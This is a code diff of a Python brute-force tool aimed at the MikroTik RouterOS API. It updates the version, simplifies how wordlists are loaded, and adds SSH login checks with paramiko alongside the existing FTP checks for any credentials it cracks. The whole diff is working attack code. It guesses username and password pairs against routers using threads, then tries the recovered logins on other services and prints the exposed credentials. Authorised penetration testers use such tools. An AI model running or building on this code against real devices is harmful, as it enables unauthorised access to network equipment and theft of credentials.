@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
-_version = "1.10"
+_version = "1.11"
 
 import time, argparse, threading, concurrent.futures
 from datetime import datetime
@@ -9,12 +9,12 @@ from pathlib import Path
 try:
     from _api import Api
 except ModuleNotFoundError:
-    raise ImportError(f"[{datetime.now().strftime('%H:%M:%S')}] Module '_api' not found. Make sure the _api.py file is present in the same directory as this tool.")
+    raise ImportError(f"[{datetime.now().strftime('%H:%M:%S')}] Module '_api' not found.")
 
 try:
     from _log import Log
 except ModuleNotFoundError:
-    raise ImportError(f"[{datetime.now().strftime('%H:%M:%S')}] Module '_log' not found. Make sure the _log.py file is present in the same directory as this tool.")
+    raise ImportError(f"[{datetime.now().strftime('%H:%M:%S')}] Module '_log' not found.")
 
 def current_time():
     return datetime.now().strftime("%H:%M:%S")
@@ -51,7 +51,6 @@ class Bruteforce:
             elif self.usernames and self.passwords:
                 is_userfile = Path(self.usernames).is_file()
                 is_passfile = Path(self.passwords).is_file()
-
                 if not is_userfile and not is_passfile:
                     self.wordlist = [(self.usernames, self.passwords)]
                 elif is_userfile and not is_passfile:
@@ -65,21 +64,14 @@ class Bruteforce:
                     pwds = self.load_file(self.passwords)
                     self.wordlist = [(u, p) for u in users for p in pwds]
             elif self.usernames:
-                if Path(self.usernames).is_file():
-                    self.wordlist = [(u, '') for u in self.load_file(self.usernames)]
-                else:
-                    self.wordlist = [(self.usernames, '')]
+                self.wordlist = [(u, '') for u in self.load_file(self.usernames)] if Path(self.usernames).is_file() else [(self.usernames, '')]
             elif self.passwords:
-                if Path(self.passwords).is_file():
-                    self.wordlist = [("admin", p) for p in self.load_file(self.passwords)]
-                else:
-                    self.wordlist = [("admin", self.passwords)]
+                self.wordlist = [("admin", p) for p in self.load_file(self.passwords)] if Path(self.passwords).is_file() else [("admin", self.passwords)]
             else:
                 self.wordlist = [("admin", "")]
         except Exception as e:
             self.log.error(f"Error loading wordlist: {e}")
             exit(1)
-
         self.wordlist = list(dict.fromkeys(self.wordlist))
 
     def get_next_combo(self):
@@ -114,6 +106,7 @@ class Bruteforce:
 
     def validate_extra_services(self):
         from ftplib import FTP
+        import paramiko
 
         for cred in self.successes:
             user = cred["user"]
@@ -132,8 +125,21 @@ class Bruteforce:
                     ftp.quit()
                 except Exception as e:
                     if self.verbose_all:
-                        self.log.debug(f"FTP validation failed for {user}:{passwd} on port {port} — {e}")
+                        self.log.debug(f"FTP failed for {user}:{passwd} — {e}")
 
+            if "ssh" in self.validate_services:
+                port = self.validate_services.get("ssh") or 22
+                try:
+                    if self.verbose_all:
+                        self.log.debug(f"Testing SSH for {user}:{passwd} on port {port}")
+                    client = paramiko.SSHClient()
+                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                    client.connect(self.target, port=port, username=user, password=passwd, timeout=5)
+                    validated.append("ssh")
+                    client.close()
+                except Exception as e:
+                    if self.verbose_all:
+                        self.log.debug(f"SSH failed for {user}:{passwd} — {e}")
 
             if validated:
                 cred["services"].extend(s for s in validated if s not in cred["services"])
@@ -149,9 +155,10 @@ class Bruteforce:
         self.log.info("[*] Attack finished.\n")
 
         if self.validate_services and self.successes:
-            for service in self.validate_services:
-                self.log.info(f"[+] Testing service validation for: {service.upper()}...")
+            services_list = ', '.join(s.upper() for s in self.validate_services.keys())
+            self.log.info(f"[*] Initiating post-login validation for: {services_list}")
             self.validate_extra_services()
+
 
         if self.successes:
             print("\n## CREDENTIAL(S) EXPOSED ##")
@@ -168,25 +175,26 @@ class Bruteforce:
         else:
             print("\nNo credentials were validated successfully with the given users and passwords.\n")
 
-# === MAIN EXECUTION ===
+# === CLI Entrypoint ===
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Mikrotik API Brute Force Tool")
-    parser.add_argument("-t", "--target", required=True, help="Mikrotik IP address")
-    parser.add_argument("-T", "--port", type=int, default=8728, help="API port (default: 8728)")
-    parser.add_argument("-U", "--user", help="Single username")
-    parser.add_argument("-P", "--passw", help="Single password")
-    parser.add_argument("-u", "--userlist", help="Path to user wordlist")
-    parser.add_argument("-p", "--passlist", help="Path to password wordlist")
-    parser.add_argument("-d", "--dictionary", help="Path to combo dictionary (user:pass)")
-    parser.add_argument("-s", "--seconds", type=int, default=1, help="Delay between attempts (default: 1s)")
-    parser.add_argument("--ssl", action="store_true", help="Use SSL connection (port 8729)")
-    parser.add_argument("--threads", type=int, default=2, help="Number of concurrent threads (default: 2, max: 15)")
-    parser.add_argument("-v", "--verbose", action="store_true", help="Show failed and warning attempts")
-    parser.add_argument("-vv", "--verbose-all", action="store_true", help="Show debug and error messages")
+    parser = argparse.ArgumentParser(description="Mikrotik RouterOS API Brute Force Tool")
+    parser.add_argument("-t", "--target", required=True)
+    parser.add_argument("-T", "--port", type=int, default=8728)
+    parser.add_argument("-U", "--user")
+    parser.add_argument("-P", "--passw")
+    parser.add_argument("-u", "--userlist")
+    parser.add_argument("-p", "--passlist")
+    parser.add_argument("-d", "--dictionary")
+    parser.add_argument("-s", "--seconds", type=int, default=1)
+    parser.add_argument("--ssl", action="store_true")
+    parser.add_argument("--threads", type=int, default=2)
     parser.add_argument("--validate", help="Comma-separated services or service=port (e.g., ftp,ssh=2222)")
+    parser.add_argument("-v", "--verbose", action="store_true")
+    parser.add_argument("-vv", "--verbose-all", action="store_true")
 
     args = parser.parse_args()
+
     Log.banner()
 
     def parse_validate_services(raw_input):
